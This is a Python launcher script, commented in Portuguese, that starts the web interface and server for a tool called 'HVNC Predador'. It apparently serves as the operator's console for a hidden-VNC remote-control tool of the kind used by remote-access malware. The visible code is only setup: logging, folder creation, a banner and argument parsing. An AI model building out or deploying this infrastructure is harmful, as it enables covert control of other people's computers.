#!/usr/bin/env python3
"""
HVNC Predador - Web Server Launcher
Script de inicialização do servidor web
"""

import os
import sys
import asyncio
import logging
import argparse
from pathlib import Path

# Adiciona o diretório web ao path
web_dir = Path(__file__).parent
sys.path.insert(0, str(web_dir))

from config import config, DevelopmentConfig, ProductionConfig
from app import app, hvnc_server

def setup_logging():
    """Configura o sistema de logging"""
    logging.basicConfig(
        level=getattr(logging, config.LOG_LEVEL),
        format=config.LOG_FORMAT,
        handlers=[
            logging.StreamHandler(sys.stdout),
            logging.FileHandler('hvnc_web.log')
        ]
    )
    
    # Reduz logs verbosos de bibliotecas
    logging.getLogger('uvicorn.access').setLevel(logging.WARNING)
    logging.getLogger('websockets').setLevel(logging.WARNING)

def create_directories():
    """Cria diretórios necessários"""
    directories = [
        config.UPLOAD_FOLDER,
        config.DOWNLOAD_FOLDER,
        config.TEMP_FOLDER,
        'logs',
        'static'
    ]
    
    for directory in directories:
        Path(directory).mkdir(exist_ok=True)
        logging.info(f"Diretório criado/verificado: {directory}")

def print_banner():
    """Exibe banner de inicialização"""
    banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                     HVNC PREDADOR WEB                       ║
    ║                  Servidor Web Iniciado                      ║
    ╠══════════════════════════════════════════════════════════════╣
    ║  Web Interface: http://{host}:{port}                    ║
    ║  HVNC Server:   tcp://{hvnc_host}:{hvnc_port}           ║
    ║  Debug Mode:    {debug}                                 ║
    ║  AES Crypto:    {aes}                                   ║
    ╚══════════════════════════════════════════════════════════════╝
    """.format(
        host=config.HOST if config.HOST != '0.0.0.0' else 'localhost',
        port=config.PORT,
        hvnc_host=config.HVNC_HOST if config.HVNC_HOST != '0.0.0.0' else 'localhost',
        hvnc_port=config.HVNC_PORT,
        debug='Enabled' if config.DEBUG else 'Disabled',
        aes='Enabled' if config.USE_AES else 'Disabled'
    )
    print(banner)

async def start_servers():
    """Inicia os servidores HVNC e Web"""
    import uvicorn
    
    # Inicia o servidor HVNC (método síncrono, já executa em thread separada)
    hvnc_server.start()
    logging.info(f"Servidor HVNC iniciado em {config.HVNC_HOST}:{config.HVNC_PORT}")
    
    # Configura o servidor web
    uvicorn_config = uvicorn.Config(
        app=app,
        host=config.HOST,
        port=config.PORT,
        log_level=config.LOG_LEVEL.lower(),
        access_log=config.DEBUG,
        reload=config.DEBUG,
        ws_ping_interval=config.WS_PING_INTERVAL,
        ws_ping_timeout=config.WS_PING_TIMEOUT
    )
    
    server = uvicorn.Server(uvicorn_config)
    
    try:
        # Executa o servidor web
        await server.serve()
    except KeyboardInterrupt:
        logging.info("Parando servidores...")
        hvnc_server.stop()
        await server.shutdown()
    except Exception as e:
        logging.error(f"Erro ao executar servidores: {e}")
        raise

def main():
    """Função principal"""
    global config
    
    parser = argparse.ArgumentParser(description='HVNC Predador Web Server')
    parser.add_argument('--host', default=config.HOST, help='Host do servidor web')
    parser.add_argument('--port', type=int, default=config.PORT, help='Porta do servidor web')
    parser.add_argument('--hvnc-port', type=int, default=config.HVNC_PORT, help='Porta do servidor HVNC')
    parser.add_argument('--debug', action='store_true', help='Modo debug')
    parser.add_argument('--prod', action='store_true', help='Modo produção')
    parser.add_argument('--no-aes', action='store_true', help='Desabilita criptografia AES')
    
    args = parser.parse_args()
    
    # Aplica configurações dos argumentos
    if args.prod:
        config = ProductionConfig.from_env()
    elif args.debug:
        config = DevelopmentConfig.from_env()
    
    config.HOST = args.host
    config.PORT = args.port
    config.HVNC_PORT = args.hvnc_port
    
    if args.debug:
        config.DEBUG = True
        config.LOG_LEVEL = "DEBUG"
    
    if args.no_aes:
        config.USE_AES = False
    
    # Configuração inicial
    setup_logging()
    create_directories()
    print_banner()
    
    # Verifica dependências
    try:
        import fastapi
        import uvicorn
        import websockets
        logging.info("Todas as dependências encontradas")
    except ImportError as e:
        logging.error(f"Dependência faltando: {e}")
        logging.error("Execute: pip install -r requirements.txt")
        sys.exit(1)
    
    # Inicia os servidores
    try:
        if sys.platform == 'win32':
            # Windows específico
            asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
        
        asyncio.run(start_servers())
    except KeyboardInterrupt:
        logging.info("Servidor parado pelo usuário")
    except Exception as e:
        logging.error(f"Erro fatal: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()